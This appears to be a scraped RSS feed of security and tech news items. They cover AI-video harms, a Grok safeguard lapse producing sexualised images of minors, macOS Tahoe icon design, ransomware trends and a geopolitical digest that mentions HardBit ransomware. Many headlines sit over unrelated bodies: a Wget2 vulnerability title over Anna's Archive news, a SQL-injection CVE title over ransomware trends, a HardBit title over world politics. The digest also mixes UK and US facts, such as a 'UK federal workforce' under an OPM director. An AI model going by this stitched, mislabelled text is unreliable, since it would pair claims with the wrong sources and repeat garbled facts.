practice, I keep coming back to the same conclusion.Right now, every AI video I encounter is harmful. Every single one, without exception.Either it's directly harmful like spreading misinformation, impersonating real people, manipulating vulnerable viewers. Or it's indirectly harmful by training us to accept a synthetic reality where nothing can be trusted and everything must be questioned. Even the "harmless" AI videos contribute to a broader erosion of trust in visual media.This technology is devastatingly effective for the purposes bad actors have found for it. The creative barrier I hoped to overcome remains in place. But now there's a new barrier too. The barrier of trust. And that one might be much harder to rebuild.]]></content:encoded></item><item><title>Threat actors insisted that Resecurity’s honeypot was real data.

Huang says this is essential to ensure that everyday Americans can prosper in the age of AI, not just those with PhDs and college degrees. This is something he is fully aligned with President Donald Trump on, and they’re already taking noticeable action to make sure it happens. At a Center for Strategic and International Studies (CSIS) fireside chat on securing U.S. leadership in artificial intelligence, Nvidia founder and CEO Jensen Huang addressed his thoughts on federal industrial policy and the best path forward for the United States. When asked about policy approaches spanning energy, regulation, and ownership frameworks, Huang focused on what he described as foundational constraints to long-term growth, linking energy availability, manufacturing capacity, and technological change.Specifically, Huang said, “President Trump walked into a situation where dramatic actions needed to be taken. The first dramatic action that needed to be taken is to reverse the mistakes in energy growth over the course of the last decade. We’ve done our country a great disservice. There are no new industries you can grow without energy.” The idea is simple: if there is no electricity to power America’s manufacturing hubs, then there’s no chance they can thrive. Simply building the manufacturing first and the electricity later will skyrocket costs, further making build-out unsustainable. He extended that argument to social and economic outcomes, adding, “If we want to fix our social issues, domestic social issues, we have to create prosperity, not just for people with PhDs and college degrees. We have to create prosperity for every segment of the economy. The largest segment of the economy is manufacturing. And we’ve offshored that for too long. For 20 years. We got to bring that back. And we have the ability to do so. And this AI industrial revolution, this flashpoint, is precisely when we should do it.”Nvidia, through its various partners, is helping build out at least $500 billion in AI infrastructure in the U.S. during Trump’s 2024 term alone. Nvidia plans to use its leverage as the company at the center of all of this to ensure America is the AI manufacturing hub of the world. This, he says, will help bring those needed and prosperous manufacturing jobs back to the States. The remarks came amid a broader discussion of how governments respond to structural shifts driven by AI, automation, and advanced computing. Rather than focusing on specific regulatory mechanisms or fiscal tools, Huang emphasized the importance of building energy supply and industrial capacity. While politicians focus on demonizing nuclear and coal, or the environmental impact of energy buildout, Huang says we should be focusing on ramping up energy production exponentially across every available vertical.Huang’s perspective is informed by decades at the intersection of technology and manufacturing. Since founding Nvidia in 1993, he has overseen its transformation into a central supplier of computing platforms for AI, data centers, and high-performance systems. That position provides direct exposure to the industrial requirements behind digital innovation, including power generation, fabrication capacity, and workforce availability. From this vantage point, energy is the basis of the economy from which everything is built. While Huang has spoken highly of the Trump administration, the relevance of these remarks extends beyond any single administration or moment. Markets consistently treat energy infrastructure and manufacturing investment as leading indicators of long-term productivity. AI intensifies that relationship by increasing demand for power-intensive facilities such as semiconductor plants and data centers. In that sense, Huang’s comments align with a broader recognition that advanced technologies remain limited by the infrastructure built out to support them.

Or, at least, the guardrails are far from as effective as we’d like them to be.xAI, the company behind Musk’s chatbot, is reviewing the incident “to prevent future issues,” and the user responsible for the prompt reportedly had their account suspended. Reportedly, in a separate post on X, Grok described the incident as an isolated case and said that urgent fixes were being issued after “lapses in safeguards” were identified.During the holiday period, we discussed how risks increased when AI developments and features are rushed out the door without adequate safety testing. We keep pushing the limits of what AI can do faster than we can make it safe. Visual models that can sexualize minors are precisely the kind of deployment that should never go live without rigorous abuse testing.So, while on one hand we see geo-blocking due to national and state content restrictions, the AI linked to one of the most popular social media platforms failed to block content that many would consider far more serious than what lawmakers are currently trying to regulate. In effect, centralized age‑verification databases become breach targets while still failing to prevent AI tools from generating abusive material.“Literally woke up to so many comments asking Grok to put me in a thong / bikini and the results having so many bookmarks. Even worse I went onto the Grok page and saw slimy disgusting lowlifes doing that to pictures of CHILDREN. Genuinely disgusting.”We can only imagine the devastating results when cybercriminals would abuse this type of weakness to defraud or extort parents with fabricated explicit content of their young ones. Tools for inserting real faces into AI-generated content are already widely available, and current safeguards appear unable to reliably prevent abuse.This incident is yet another compelling reason to reduce your digital footprint. Think carefully before posting photos of yourself, your children, or other sensitive information on public social media accounts. Treat everything you see online—images, voices, text—as potentially AI-generated unless they can be independently verified. They’re not only used to sway opinions, but also to solicit money, extract personal information, or create abusive material.

Apple releases macOS Tahoe. Main attraction? Adding unpleasant, distracting, illegible, messy, cluttered, confusing, frustrating icons (their words, not mine!) to every menu item:It’s bad. But why exactly is it bad? Let’s delve into it!Disclaimer: screenshots are a mix from macOS 26.1 and 26.2, taken   from stock Apple apps only that come pre-installed with the system. No system settings were modified.The main function of an icon is to help you find what you are looking for faster.Perhaps counter-intuitively, adding an icon to everything is exactly the wrong thing to do. To stand out, things need to be different. But if everything has an icon, nothing stands out.The same applies to color: black-and-white icons look clean, but they don’t help you find things faster!Microsoft used to know this:Look how much faster you can find Save or Share in the right variant:It also looks cleaner. Less cluttered.A colored version would be even better (clearer separation of text from icon, faster to find):I know you won’t like how it looks. I don’t like it either. These icons are hard to work with. You’ll have to actually design for color to look nice. But the principle stands: it is way easier to use.If you want icons to work, they need to be . I need to be able to learn what to look for.For example, I see a “Cut” command and  next to it. Okay, I think. Next time I’m looking for “Cut,” I might save some time and start looking for  instead.How is Tahoe doing on that front? I present to you: Fifty Shades of “New”:I even collected them all together, so the absurdity of the situation is more obvious.Granted, some of them are different operations, so they have different icons. I guess creating a smart folder is different from creating a journal entry. But this?Yes. One of them is a checkmark. And they can’t even agree on the direction of an arrow!Find (which is sometimes called Search, and sometimes Filter):Delete (from Cut-Copy-Paste-Delete fame):These are not some obscure, unique operations. These are OS basics, these are foundational. Every app has them, and they are always in the same place. They shouldn’t look different!Icons are also used in toolbars. Conceptually, operations in a toolbar are identical to operations called through the menu, and thus should use the same icons. That’s the simplest case to implement: inside the same app, often on the same screen. How hard can it be to stay consistent?Photos: same  and  mismatch, but reversed ¯\_(ツ)_/¯Maps and others often use different symbols for zoom:Another cardinal sin is to use the same icon for different actions. Imagine: I have learned that  means “New”:Then I open an app and see. “Cool”, I think, “I already know what it means”:You’d think: okay,  means quick look:Sometimes, sure. Some other times,  means “Show completed”:Same as with consistency, icon reuse doesn’t only happen between apps. Sometimes you see  in a toolbar:Then go to the menu  and see  means something else:Sometimes identical icons meet in the same menu.Sometimes next to each other.Sometimes they put an entire barrage of identical icons in a row:This doesn’t help anyone. No user will find a menu item faster or will understand the function better if all icons are the same.The worst case of icon reuse so far has been the Photos app:It feels like the person tasked with choosing a unique icon for every menu item just ran out of ideas.When looking at icons, we usually allow for slight differences in execution. That lets us, for example, understand that these  road signs mean the same thing:Same applies for icons: if you draw an arrow going out of the box in one place and also an arrow and the box but at a slightly different angle, or with different stroke width, or make one filled, we will understand them as meaning the same thing.Like,  is supposed to mean something else from ? Come on!Or two letters A that only slightly differ in the font size:A pencil is “Rename” but a slightly thicker pencil is “Highlight”?Arrows that use different diagonals?Three dots occupying ⅔ of space vs three dots occupying everything. Seriously?The sheet of paper that changes meaning depending on if its corner is folded or if there are lines inside?But the final boss are arrows. They are all different:Supposedly, a user must become an expert at noticing how squished the circle is, if it starts top to right or bottom to right, and how far the arrow’s end goes.Do I care? Honestly, no. I could’ve given it a shot, maybe, if Apple applied these consistently. But Apple considers  and  to mean the same thing in one place, and expects me to notice minute details like this in another?Sorry, I can’t trust you. Not after everything I’ve seen.Icons are supposed to be easily recognizable from a distance. Every icon designer knows: small details are no-go. You can have them sometimes, maybe, for aesthetic purposes, but you can’t  on them.And icons in Tahoe menus are . Most of them fit in a 12×12 pixel square (actual resolution is 24×24 because of Retina), and because many of them are not square, one dimension is usually even less than 12.It’s not a lot of space to work with! Even Windows 95 had 16×16 icons. If we take the typical DPI of that era at 72 dots per inch, we get a physical icon size of 0.22 inches (5.6 mm). On a modern MacBook Pro with 254 DPI, Tahoe’s 24×24 icons are 0.09 inches (2.4 mm). Sure, 24 is bigger than 16, but in reality, these icons’ area is 4 times as small!I struggle. I can tell they are different. But I definitely struggle to tell what’s being drawn.Even zoomed in 20×, it’s still a mess:Or here. These are three different icons:Am I supposed to tell plus sign from sparkle here?Some of these lines are half the pixel thicker than the other lines, and that’s supposed to be the main point:Is this supposed to be an arrow?It even got an even tinier viewfinder, which you can almost see if you zoom in 20×:Or here. There is a box, inside that box is a circle, and inside it is a tiny letter  with a total height of 2 pixels:I don’t. But it’s there...And this is a window! It even has traffic lights! How adorable:Remember: these are retina pixels, ¼ of a real pixel. Steve Jobs himself claimed they were invisible.It turns out there’s a magic number right around 300 pixels per inch, that when you hold something around to 10 to 12 inches away from your eyes, is the limit of the human retina to differentiate the pixels.And yet, Tahoe icons rely on you being able to see them.When you have so little space to work with, every pixel matters. You can make a good icon, but you have to choose your pixels very carefully.For Tahoe icons, Apple decided to use vector fonts instead of good old-fashioned bitmaps. It saves Apple resources—draw once, use everywhere. Any size, any display resolution, any font width.But there’re downsides: fonts are hard to position vertically, their size doesn’t map directly to pixels, stroke width doesn’t map 1-to-1 to pixel grid, etc. So, they work everywhere, but they also look blurry and mediocre everywhere:They certainly start to work better once you give them more pixels.or make graphics simpler. But the combination of small details and tiny icon size is deadly. So, until Apple releases MacBooks with 380+ DPI, unfortunately, we still have to care about the pixel grid.Icons might serve another function: to help users understand the meaning of the command.For example, once you know the context (move window), these icons explain what’s going on faster than words:But for this to work, the user must understand what’s drawn on the icon. It must be a familiar object with a clear translation to computer action (like Trash can → Delete), a widely used symbol, or an easy-to-understand diagram. HIG:A rookie mistake would be to misrepresent the object. For example, this is how selection looks like:But its icon looks like this:Honestly, I’ve been writing this essay for a week, and I still have zero ideas why it looks like that. There’s an object that looks like this, but it’s a text block in Freeform/Preview:It’s called  in SF Symbols:Why did it become a metaphor for “Select all”? My best guess is it’s a mistake.Another place uses text selection from iOS as a metaphor. On a Mac!Some concepts have obvious or well-established metaphors. In that case, it’s a mistake not to use them. For example, bookmarks: . Apple, for some reason, went with a book:Sometimes you already have an interface element and can use it for an icon. However, try not to confuse your users. Dots in a rectangle look like password input, not permissions:Icon here says “Check” but the action is “Uncheck”.Terrible mistake: icon doesn’t help, it actively confuses the user.It’s also tempting to construct a two-level icon: an object and some sort of indicator. Like, a checkbox and a cross, meaning “Delete checkbox”:Or a user and a checkmark, like “Check the user”:Unfortunately, constructs like this rarely work. Users don’t build sentences from building blocks you provide; they have no desire to solve these puzzles.Finding metaphors is hard. Nouns are easier than verbs, and menu items are mostly verbs. How does open look? Like an arrow pointing to the top right? Why?I’m not saying there’s an obvious metaphor for “Open” Apple missed. There isn’t. But that’s the point: if you can’t find a good metaphor, using no icon is better than using a bad, confusing, or nonsensical icon.There’s a game I like to play to test the quality of the metaphor. Remove the labels and try to guess the meaning. Give it a try:It’s delusional to think that there’s a good icon for every action if you think hard enough. There isn’t. It’s a lost battle from the start. No amount of money or “management decisions” is going to change that. The problems are 100% self-inflicted.All this being said, I gotta give Apple credit where credit is due. When they are good at choosing metaphors, they are good:A special case of a confusing metaphor is using different metaphors for actions that are direct opposites of one another. Like Undo/Redo, Open/Close, Left/Right.It’s good when their icons use the same metaphor:Because it saves you time and cognitive resources. Learn one, get another one for free.Because of that, it’s a mistake not to use common metaphors for related actions:Another mistake is to create symmetry where there is none. “Back” and “See all”?Some menus in Tahoe make both mistakes. E.g. lack of symmetry between Show/Hide and false symmetry between completed/subtasks:Import not mirrored by Export but by Share:Authors of HIG are arguing against including text as a part of an icon. So something like this:I agree, but Tahoe has more serious problems: icons consisting  of text. Like this:It’s unclear where “metaphorical, abstract icon text that is not supposed to be read literally” ends and actual text starts. They use the same font, the same color, so how am I supposed to differentiate? Icons just get in a way: A...Complete? AaFont? What does it mean?I can maybe understand  and . Dots are supposed to represent something. I can imagine thinking that led to . But ? No decorations. No effects. Just plain Abc. Really?One might think that using icons to illustrate text transformations is a better idea.and just from the icon alone understand what will happen with the text. Icon  the action.Also, BIU are well-established in word processing, so all upside?Not exactly. The problem is the same—text icon looks like text, not icon. Plus, these icons are . What’s the point of taking the first letter and repeating it? The word “Bold” already starts with a letter “B”, it reads just as easily, so why double it? Look at it again:It’s also repeated once more as a shortcut...There is a better way to design this menu:And it was known to Apple for at least 33 years.Operating system, of course, uses some visual elements for its own purposes. Like window controls, resize handles, cursors, shortcuts, etc. It would be a mistake to use those in icons.Unfortunately, Apple fell into this trap, too. They reused arrows.HIG has an entire section on ellipsis specifically and how dangerous it is to use it anywhere else in the menu.And this exact problem is in Tahoe, too.Without icons, you can just scan the menu from top to bottom, reading only the first letters. Because they all align:In Tahoe, though, some menu items have icons, some don’t, and they are aligned differently:Some items can have both checkmarks  icons, or have only one of them, or have neither, so we get situations like this:This menu deserves its own category:Same icon for different actions. Missing the obvious metaphor. Somehow making the first one slightly smaller than the second and third. Congratulations! It got it all.I’ve been mentioning HIG a lot, and you might be wondering: is an interface manual from 1992 still relevant today? Haven’t computers changed so much that entirely new principles, designs, and idioms apply?Yes and no. Of course, advice on how to adapt your icons to black-and-white displays is obsolete. But the principles—as long as they are good principles—still apply, because they are based on how humans work, not how computers work.Humans don’t get a new release every year. Our memory doesn’t double. Our eyesight doesn’t become sharper. Attention works the same way it always has. Visual recognition, motor skills—all of this is exactly as it was in 1992.So yeah, until we get a direct chip-to-brain interface, HIG will stay relevant.In my opinion, Apple took on an impossible task: to add an icon to every menu item. There are just not enough good metaphors to do something like that.But even if there were, the premise itself is questionable: if everything has an icon, it doesn’t mean users will find what they are looking for faster.And even if the premise was solid, I still wish I could say: they did the best they could, given the goal. But that’s not true either: they did a poor job consistently applying the metaphors and designing the icons themselves.I hope this article would be helpful in avoiding common mistakes in icon design, which Apple managed to collect all in one OS release. I love computers, I love interfaces, I love visual communication. It makes me sad seeing perfectly good knowledge already accessible 30 years ago being completely ignored or thrown away today.On the upside: it’s not that hard anymore to design better than Apple! Let’s drink to that. Happy New year!During review of this post I was made familiar with Jim Nielsen’s article, which hits a lot of the same points as I do. I take that as a sign there’s some common truth behind our reasoning.Also note: Safari → File menu got worse since 26.0. Used to have only 4 icons, now it’s 18!Thanks Kevin, Ryan, and Nicki for reading drafts of this post.]]></content:encoded></item><item><title>Critical GNU Wget2 Vulnerability Let Remote Attackers to Overwrite Sensitive Files</title><link>https://cybersecuritynews.com/gnu-wget2-vulnerability/</link><author></author><category>security</category><pubDate>Mon, 5 Jan 2026 10:56:51 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

The site also actively provides assistance to AI researchers who want to use its library for model training. More recently, Anna’s Archive announced it had created a massive 300TB backup of Spotify, which it is slowly releasing to the public at large.Since its launch, Anna’s Archive has also received pushback from rightsholders. The site has been blocked in various countries, and was sued in the U.S. after it scraped WorldCat. Despite this legal pressure, the main annas-archive.org domain name remained operational, until it didn’t.Anna’s .ORG Domain SuspendedA few hours ago, the site’s original domain name suddenly became unreachable globally. The annas-archive.org domain status was changed to “serverHold,” which is typically done by the domain registry. This status effectively means that the domain is suspended and under investigation. Similar action has previously been taken against other pirate sites. It is rare to see a .org domain involved in domain name suspensions. The American non-profit Public Interest Registry (PIR), which oversees the .org domains, previously refused to suspend domain names voluntarily, including thepiratebay.org. The registry’s cautionary stance suggests that the actions against annas-archive.org are backed by a court order. TorrentFreak asked PIR for a comment on their supposed involvement in the domain suspension, hoping to find out more about the legal grounds, but the organization did not immediately reply.  PIR’s marketing director, Kendal Rowe, informs TorrentFreak that “unfortunately, PIR is unable to comment on the situation at this time.”It is possible that, in response to the ‘DRM-circumventing’ Spotify backup, rightsholders requested an injunction targeting the domain name. However, we have seen no evidence of that. In the WorldCat lawsuit, OCLC requested an injunction to force action from intermediaries, including domain registries, but as far as we know, that hasn’t been granted yet. Anna’s Archive Remains ResilientOn Reddit, Anna’s Archive explains that the recent suspension is a mere hiccup too, pointing users to alternative domains. “The .org domain apparently has been suspended. Our other domains work fine, and we’ve added some more. We recommend checking our Wikipedia page for the latest domains. This unfortunately happens to shadow libraries on a regular basis. ” “We don’t believe this has to do with our Spotify backup,” AnnaArchivist adds. At the time of writing, the site is indeed still operational from the older .li and .se domains, as well as the .in and .pm variants that were just added. However, with legal pressure mounting, there are no guarantees that these domains remain operational. ]]></content:encoded></item><item><title>CVE-2025-31044 - WordPress Premium SEO Pack &lt;= 3.3.2 - SQL Injection Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-31044</link><author></author><category>vulns</category><pubDate>Mon, 5 Jan 2026 10:23:17 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-31044

This occurred despite a significant increase in attack volume: according to Recorded Future Intelligence, publicly reported attacks rose to 7,200 in 2025 compared to 4,900 in 2024, demonstrating a 47% increase.For context, Recorded Future classifies both encryption attacks and data theft attacks with an extortion component under the ransomware umbrella. While exact numbers are difficult to isolate, approximately 50% of all attacks we track fall into the data theft and extortion category.This declining profitability is driving ransomware groups to expand and evolve their tactics. Here are three trends organizations should prepare for heading into 2026.Trend 1: DDoS services return to the RaaS modelWith affiliates earning less and many ransomware operators abandoning the Ransomware-as-a-Service (RaaS) model to operate independently, remaining RaaS operations must offer more value to attract and retain affiliates. One increasingly common differentiator: bundled DDoS services.The newly formed Chaos ransomware group (distinct from the older group of the same name) exemplifies this trend, providing DDoS capabilities to all affiliates. While this tactic isn't new—for example, REvil previously offered similar services—it fell out of favor for a period. Now, with fewer ransom payments to share, RaaS operators are reintroducing premium services to maintain their affiliate networks.What this means for defenders: Organizations should ensure their DDoS mitigation strategies account for attacks that may accompany ransomware incidents. The pressure tactics are becoming multi-pronged.Trend 2: Insider recruitment attempts are acceleratingStolen credentials, vulnerability exploitation, and phishing remain by far the most common initial access vectors for ransomware groups, with social engineering as a distant but growing fourth method. However, there has been a notable increase in ransomware groups working with native English speakers to recruit corporate insiders.The most public example came earlier this year when a ransomware group attempted to recruit a reporter at the BBC. But this represents only the visible tip of a larger trend. Private reporting indicates that insider recruitment attempts increased significantly throughout 2025 and will likely continue growing, especially if workforce reductions at major companies persist into 2026.What this means for defenders: Insider threat programs should be evaluated and strengthened. Employee awareness training should address the possibility of external recruitment attempts, and organizations should monitor for anomalous access patterns that could indicate insider-facilitated attacks.Trend 3: Gig workers as unwitting attack vectorsAccording to a recent FBI advisory, ransomware groups have begun exploiting gig work platforms to carry out attacks when remote methods fail. In one documented case, an attacker successfully executed a social engineering help desk scam but couldn't install their tools remotely due to security controls. Their solution: recruiting a gig worker through a legitimate platform to physically enter corporate offices and steal data.The gig worker was unaware they were working for hackers, believing they were performing a legitimate IT task. The targeted employee thought they were assisting someone from the help desk. While this attack vector remains rare, the accessibility and global reach of gig work platforms means other groups could replicate this approach with minimal effort.What this means for defenders: Physical security protocols should account for social engineering scenarios involving legitimate-looking third parties. Verification procedures for on-site IT work deserve renewed scrutiny.Looking ahead: One big prediction for 2026The ransomware ecosystem has seen tremendous growth among actors and groups operating outside of Russia.Recorded Future believes that 2026 will be the first year the number of  ransomware actors outside Russia exceeds those emerging within it. This doesn't indicate a decline in Russian-based operations; instead, it reflects how dramatically the global ransomware ecosystem has expanded.The bottom line: Strengthen your ransomware defensesUnderstanding emerging ransomware tactics is the first step toward defending against them. To stay ahead of threat actors and protect your organization:]]></content:encoded></item><item><title>Reminder: Survey on threats experienced by journalists and security researchers</title><link>https://databreaches.net/2026/01/04/reminder-survey-on-threats-experienced-by-journalists-and-security-researchers/?pk_campaign=feed&amp;pk_kwd=reminder-survey-on-threats-experienced-by-journalists-and-security-researchers</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 4 Jan 2026 16:25:18 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Illinois Department of Human Services tightens map security after data incident</title><link>https://databreaches.net/2026/01/04/illinois-department-of-human-services-tightens-map-security-after-data-incident/?pk_campaign=feed&amp;pk_kwd=illinois-department-of-human-services-tightens-map-security-after-data-incident</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 4 Jan 2026 16:24:50 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Cryptocurrency Scam Emails and Web Pages As We Enter 2026, (Sun, Jan 4th)</title><link>https://isc.sans.edu/diary/rss/32594</link><author></author><category>threatintel</category><pubDate>Sun, 4 Jan 2026 04:30:30 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>HardBit 4.0 Ransomware Evolution</title><link>https://labs.jamessawyer.co.uk/newsdesk/20260103-002009/</link><author>/u/AriannaLombardi76</author><category>netsec</category><pubDate>Sat, 3 Jan 2026 21:02:02 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Great power rivalries and regional fissures deepen systemic uncertainty even as selective engagements and economic shifts paint a layered geopolitical landscape. Military modernization races parallel diplomatic thaws to choppy cessation of hostilities, while economic dislocations surface in tech and resource sectors. The global order fractures into multiplex trajectories where strategic alignments co-exist uneasily with enduring contestation.The China-India thaw in 2025 indicated pragmatic recalibration but exposes a fraught tension between border management and persistent territorial dispute, underpinned by nationalist fault lines and geostrategic competition. Meanwhile, Southeast Asia’s localized conflict, exemplified by the Thailand-Cambodia border ceasefire, underscores how deeply historical legacies and nationalist fervour poison bilateral relations despite ASEAN mediation efforts. Myanmar’s controlled election and Vietnam’s reformist continuity highlight divergent political adaptations to regional instability.Ukraine emerges as a crucible of leadership and intelligence evolution, manifest in Zelenskyy’s appointment of a hard-edged military-intelligence chief and intricate peace negotiation signalling amidst ongoing conflict. The United States’ defense and tech posture manifests dual pressures of aging platforms, reform imperatives, and the emerging prominence of autonomous systems like Northrop Grumman’s Talon drone, reflecting a strategic pivot toward innovation amid resource constraints.Economic dislocations reveal themselves in sharply contrasting corporate and financial dynamics. Tesla’s delivery declines and BYD’s ascent illustrate shifting global technology leadership intertwined with supply chain upheavals, subsidy expiration, and consumer sentiment fragility. Tencent’s withholding of IPO details contrasts with biotech volatility around Sellas Life Sciences, revealing investor appetite and fear in innovation-driven sectors. Meanwhile, the US financial markets are awash with retail trading frenzies, skeptical of narratives and prone to emotional pitfalls, where prop trading and algorithmic deployment expose the tension between aspiration and discipline.Domestically, the UK contends with acute political shifts: Reform party’s rejection of Tory overtures exposes an identity crisis amid deteriorating governance perceptions; controversies over immigration policy, legal aid for prisoners, and the European Court of Human Rights fuel heated debates about sovereignty and justice. Public service institutions face workforce attrition, emblematised by OPM initiatives failing amid budget limits and cultural dissonance.At the intersection of environmental and social crisis, climate change manifests in accelerating ecological collapse and uneven social burdens-from coral reef die-back and deforestation in Nicaragua to US droughts and UK heatwaves-intensifying systemic vulnerabilities against a backdrop of scientific resource erosion.In this multiplex crisis environment, systemic fragilities arise not only from overt conflict but from subtle coordination failures, institutional inertia, and information asymmetries. The interplay of global technological competition, regional nationalist assertiveness, and financial market exuberance produces tension points where policy choices, corporate strategies, and public sentiment collide unpredictably.Markets price coordination. Institutions signal fragmentation.

Key operational mechanisms-such as management of disputed border sectors-have stabilised frontline tensions, while limited economic engagements resumed, including eased export controls on strategic technologies like tunnel boring machines and rare earths. Yet, the retention of fundamental territorial disputes, sporadic incidents like the November 2025 detention of an Indian national in China, and India's ongoing strategic alignments with Western partners and its close ties with Taiwan complicate any deep reconciliation.Analysts assess the progress not as a US-driven outcome but the product of Beijing and Delhi’s mutual economic dependence and conflict cost assessment. Nationalism and historical mistrust act as persistent barriers to deeper trust-building, with third-party actors like Pakistan and the US forecast to continue influencing the diplomatic trajectory. Expectations for 2026 suggest incremental, cautious engagement amidst ongoing competition, with diplomatic trust vulnerable to incident-driven setbacks.Southeast Asia Border Conflict and Elections (T2)The December 2025 ceasefire between Thailand and Cambodia marks a fragile pause in a conflict dating back over a century and most recently inflamed by multiple military clashes in 2025 that caused significant casualties and displacement. Despite ASEAN-led diplomatic mediation and a freeze on frontlines, deep-seated mistrust and nationalist fervour ensure bilateral relations remain fraught with bitterness. The upcoming Thai parliamentary election frames an effort to stabilise political turbulence, yet structural volatility undergirds domestic politics.Myanmar’s purported multiphase elections, dominated by the military-backed USDP claiming overwhelming success, are widely viewed as a legitimising facade rather than a genuine democratic transition, with ethnic conflicts and resistance consolidated beneath political theatre. Vietnam’s leadership pursues administrative reforms focusing on state administration slimming and policy coherence, reflecting a more technocratic approach to growth amid regional uncertainties.The interweaving of nationalism, military dominance, and reformist continuity depicts Southeast Asia facing heterogeneous political trajectories, each shaped by long historical grievances and immediate strategic calculations.Ukraine Conflict and Intelligence Leadership Shift (T3)Ukraine’s evolving security posture is exemplified by President Zelenskyy’s appointment of Gen. Kyrylo Budanov as chief of staff, elevating wartime military-intelligence operational leadership into the highest executive policymaking echelon. Budanov’s reputation for deep strikes against Russian military infrastructure aligns with Ukraine’s intensifying focus on integrating intelligence capabilities with political-diplomatic engagement. Concurrent Russian missile strikes and cyclical drone attacks sustain a brutal conflict dynamic, while U.S.-led diplomatic efforts negotiate fragile peace proposals, increasingly constrained by escalatory incidents such as the disputed drone attack on Putin’s residence.Ukraine signals near completion of peace accords but warns of unresolved territorial disputes. The U.S. maneuvers to coordinate allies and stabilize talks face growing challenges amid persistent hostilities. The appointment reshapes Ukraine’s command communications, risking higher integration but also concentrated vulnerabilities.US Air Force Collaborative Combat Aircraft Program (T4)The U.S. Air Force’s designation of Northrop Grumman’s Talon as a YFQ-48A prototype within the Collaborative Combat Aircraft program marks a strategic inflection toward versatile, semi-autonomous wingman drones that enhance manned fighter capabilities affordably and flexibly. The Talon’s redesigned lighter and modular architecture, accelerated development via autonomous testbeds, and international export ambitions underscore a defense sector prioritising innovation amid budgetary and technological pressures.This program signals a shift away from monolithic platforms toward distributed capabilities that can intelligently execute strikes, reconnaissance, and electronic warfare in contested environments. Air Force emphasis on continuous competition among contractors aims to sustain technological edge dividends while controlling costs.Tesla-BYD Market Dynamics and Electric Vehicle Industry (T5)Tesla’s strategic challenges crystallised in the 2025 collapse of its $2.67 billion supply contract with South Korean cathode maker L&F, reflecting a severe contraction linked to Cybertruck production delays, shifting internal sourcing, and the expiration of U.S. EV tax credits. Tesla’s automotive deliveries declined sharply by 16% year-over-year in Q4 2025, with significant loses in crucial European markets to BYD, which overtook Tesla in BEV deliveries amid strong Chinese government support and expanding Southeast Asian demand.Tesla’s narrative increasingly focuses on AI and robotics promises, detaching stock valuation from delivery fundamentals and attracting polarized investor sentiment. BYD’s ascendancy epitomises China’s targeted industrial policy effectively challenging U.S. EV leadership. Market observers await Tesla’s technical resolutions and strategic pivots, weighing sustainability amid intensifying competition.UK Federal Workforce Decline and Reform Initiatives (T6)The UK federal workforce contraction, estimated at around 9% in recent periods, reflects cumulative effects of Deferred Retirement Program incentives, hiring freezes, and mass probationary terminations. OPM Director Scott Kupor’s “Make Government Cool Again” initiative, promising a tech-focused “U.S. Tech Force” to inject youthful engineers for short-term modernization baffles a demoralised and ageing civil service facing pay stagnation, telework retrenchment, and benefit erosion.Internal skepticism surrounds the proposal’s effectiveness amid systemic bureaucratic inertia and political constraints. Workforce morale and trust suffer under perceptions of hollow PR masking deep cuts, while short-term hires risk accelerating brain drain. The federal sector grapples with reconciling modernization needs with fiscal discipline and employee retention.HardBit 4.0 Ransomware Evolution (T7)The HardBit ransomware family’s fourth iteration exhibits elevated operational security with mandatory operator-supplied runtime authorization, blurring forensic attribution. Its dual interface models, leveraging legacy infection deployment alongside contemporary hands-on-keys techniques, and an optional destructive wiper mode, represent hybrid malware design converging extortion and sabotage.Lateral movement enabled through stolen credentials and disablement of recovery vectors reflects targeting of high-value networks for durable control. The absence of data leak websites limits external visibility into victimology, complicating response efforts. This evolution spotlights the intensifying sophistication and malice of ransomware operations.Retail Trading Psychology and Prop Firm Challenges (T8)Retail traders transitioning from paper to live funded accounts confront intensified emotional volatility, manifest in overtrading, fear-of-missing-out, and breakdowns in strict exit discipline. Community consensus underscores psychological mastery and process adherence as decisive factors exceeding raw strategy refinement. Journaling, rule automation, and small position sizing emerge as practical tools to counter impulsiveness.Prop firms' opaque business models amplify trader frustration, with high failure rates and constraints skewed toward firm profitability. Aggressive daily payout targets and risk control regimes challenge trader consistency, fostering burnout and attrition. Emotional reprogramming, not suppression, is critical for sustainable trading success.DC Fiction Beyond Political Drama (T9)Washington DC’s cultural narratives extend beyond political machinations into richly textured urban and social milieus. Authors like George Pelecanos depict blue-collar neighborhoods with detective stories rooted in tangible experiences rather than elite spheres. Films like  celebrate everyday hustling amid bureaucratic absurdity, blending humor with social empathy.Historical fiction, occult urban fantasy, and contemporary thrillers capture varied subcultures and socio-economic realities often overlooked in politicised portrayals. This literary and cinematic diversity fulfills a desire for authentic representation of DC’s complex identity.Climate Crisis Manifestations and Ecological Impacts (T10)Record-breaking heatwaves, accelerated deforestation in Nicaragua’s Bosawas Reserve, melting glaciers triggering volcanic risks, and acute drought-induced agricultural devastation in regions like Jordan mark an escalation of climate-induced polycrisis globally. Ecological degradation proceeds amid inadequate scientific capacity as critical research institutions face closure.Urban areas and vulnerable populations bear disproportionate suffering from intensifying climate extremes, reflecting systemic inequality embedded in infrastructure and policy gaps. Adaptation efforts remain nascent and incomplete, exposing fragile overlays of human and natural systems to cascading failure.UK Political Turmoil and Immigration Policy Paradoxes (T11)UK’s political landscape is convulsed by conflicting pressures: Reform Party’s rejection of Tory merger overtures amid identity and purity anxieties; Labour’s criticized immigration enforcement failed to stem record Channel crossings; Human Rights court decisions granting compensation to violent offenders inciting public outrage; and debates over EU legal constraints versus national sovereignty.Public discourse is steeped in nationalism, polarisation, and deep distrust toward establishment parties, complicated by legal and humanitarian obligations. The reciprocal hostility between UK and France over migrant crossings exemplifies escalating diplomatic and domestic tensions.Tesla and Tech Sector Market Volatility (T12)Despite fundamental 